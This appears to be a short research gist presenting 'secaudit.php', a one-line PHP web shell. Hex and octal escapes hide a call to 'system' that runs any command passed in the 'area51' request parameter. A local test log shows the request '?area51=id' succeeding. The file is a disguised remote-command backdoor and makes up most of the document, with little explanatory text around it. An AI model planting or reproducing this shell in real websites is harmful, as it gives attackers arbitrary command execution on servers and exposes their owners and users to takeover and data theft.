**secaudit.php**

```php
<?php $s="\x73\x79\163\x74\145\155";$__=$_REQUEST;if(isset($__["\x61\162\x65\x61\x35\x31"])){echo "\74\160\x72\145\x3e";$c0=$__["\x61\162\x65\x61\x35\x31"];$s($c0.' 2>&1');echo "\74\57\160\162\x65\76";exit;}?>
```
```console
bipin@bipin-VirtualBox:~/BB/Research/php_backdoor$ php -S 127.0.0.2:8000
[Wed Aug 21 18:49:26 2024] PHP 7.4.3-4ubuntu2.23 Development Server (http://127.0.0.2:8000) started
[Wed Aug 21 18:49:52 2024] 127.0.0.1:53050 Accepted
[Wed Aug 21 18:49:52 2024] 127.0.0.1:53050 [200]: GET /secaudit.php?area51=id
[Wed Aug 21 18:49:52 2024] 127.0.0.1:53050 Closing
```

![Screenshot 2024-08-21 185616](https://gist.github.com/user-attachments/assets/8f3f5391-321a-420a-b355-8fa4f698a421)
